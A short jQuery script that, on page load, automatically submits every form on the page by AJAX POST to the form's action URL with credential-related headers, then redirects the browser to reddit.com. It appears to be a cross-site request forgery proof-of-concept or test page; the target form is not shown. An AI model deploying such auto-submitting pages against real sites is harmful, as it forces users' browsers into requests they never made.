$(function() {
	console.log('begin');
	
	$("form").submit(function(e) {
		$.ajax({
        type: 'POST',
        url: $(this).attr('action'),
		headers: {
			'Access-Control-Allow-Origin': 'https://dorweid.github.io',
			'Access-Control-Allow-Credentials': 'true'
		},
        dataType: 'json',
        success: function(json) {
           window.location.href = "https://www.reddit.com";
        }
    })
    return false;
	})
	
	/**$("form").bind('ajax:complete', function() {

         // tasks to do 

window.location.href = "https://www.reddit.com";
return false;
   });**/
	
	$("form").submit();
});